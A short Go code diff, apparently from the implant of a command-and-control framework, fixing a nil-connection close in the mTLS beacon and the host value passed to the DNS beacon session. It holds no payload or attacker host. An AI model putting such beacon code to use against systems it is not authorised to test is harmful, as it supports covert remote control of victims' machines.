@@ -211,11 +211,13 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 			return mtls.WriteEnvelope(conn, envelope)
 		},
 		Close: func() error {
-			err = conn.Close()
-			if err != nil {
-				return err
+			if conn != nil {
+				err = conn.Close()
+				if err != nil {
+					return err
+				}
+				conn = nil
 			}
-			conn = nil
 			return nil
 		},
 		Cleanup: func() error {
@@ -341,7 +343,7 @@ func dnsBeacon(uri *url.URL) *Beacon {
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
-			client, err = dnsclient.DNSStartSession(uri.Host, opts)
+			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] dns connection error %s", err)
